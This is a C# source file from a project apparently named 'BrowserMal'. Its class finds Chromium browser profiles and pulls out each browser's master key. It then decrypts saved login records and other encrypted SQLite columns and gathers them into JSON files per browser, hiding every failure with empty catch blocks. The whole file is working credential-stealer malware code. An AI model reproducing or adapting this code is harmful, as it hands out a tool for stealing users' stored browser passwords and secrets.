using BrowserMal.Browser;
using BrowserMal.Util;
using System;
using System.Collections.Generic;
using System.IO;
using BrowserMal.SQLite;
using BrowserMal.Model;
using BrowserMal.Encryption;

namespace BrowserMal.Manager
{
    public class ChromiumManager<T> : Manager<T>
    {
        public ChromiumManager(string tableName, SqliteTableModel sqliteTableModel) : base(tableName, sqliteTableModel)
        {
        }

        public override Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType)
        {
            try
            {
                foreach (BrowserModel browser in browsers)
                {
                    if (!Directory.Exists(browser.Location))
                        continue;

                    byte[] key = ChromiumDecryption.GetMasterKey(browser.Location);

                    if (key == null)
                        continue;

                    browser.MasterKey = key;

                    List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);

                    if (result.Count == 0)
                        continue;

                    _resultList.Add($"{browser.Name}_{_tableName}.json", JsonUtil.GetJson<T>(result));
                }

                return _resultList;
            }
            catch { }

            return new Dictionary<string, string>();
        }

        private List<T> GetLogins(string path, byte[] masterKey, string profileType)
        {
            List<string> profiles = Browser.ChromiumUtil.GetAllProfiles(path, profileType);
            List<T> creds = new List<T>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile, masterKey));
            }

            return creds;
        }

        private List<T> GetProfileLogins(string path, byte[] masterKey)
        {
            List<T> generic = new List<T>();

            SqliteHandler sqLiteHandler = new SqliteHandler(path);
            sqLiteHandler.ReadTable(_tableName);

            SqliteHandler.TableEntry[] entries = sqLiteHandler.GetTableEntries();

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string[] values = GrabAndValidateSqliteValues(_sqliteTableModel.GetColumns(), ref sqLiteHandler, i, masterKey, out bool ignore);
                    if (ignore)
                        continue;

                    T obj = CreateInstanceOfType(values);
                    generic.Add(obj);
                 
                }
                catch { }
            }

            return generic;
        }

        private string[] GrabAndValidateSqliteValues(List<ColumnModel> columns, ref SqliteHandler sqLiteHandler, int row, byte[] masterKey, out bool ignore)
        {
            string[] values = new string[columns.Count];

            for (int i = 0; i < columns.Count; i++)
            {
                string value = Format(
                    DecodeValue(columns[i].IsEncrypted(), sqLiteHandler.GetValue(row, columns[i].GetName()), masterKey), 
                    columns[i].IsNeedsFormatting(),
                    columns[i].GetFunction()
                );

                if (columns[i].IsImportant() && string.IsNullOrEmpty(value))
                {
                    ignore = true;
                    return default;
                }

                values[i] = value;
            }

            ignore = false;
            return values;
        }

        private string Format(string value, bool needsFormatting, Func<object, object> function)
        {
            return (needsFormatting) ? (string)function(value) : value;
        }

        private string DecodeValue(bool isEncrypted, string outputValue, byte[] masterKey)
        {
            return (isEncrypted) ? ChromiumDecryption.GetEncryptedValue(outputValue, masterKey) : outputValue;
        }

        
    }
}
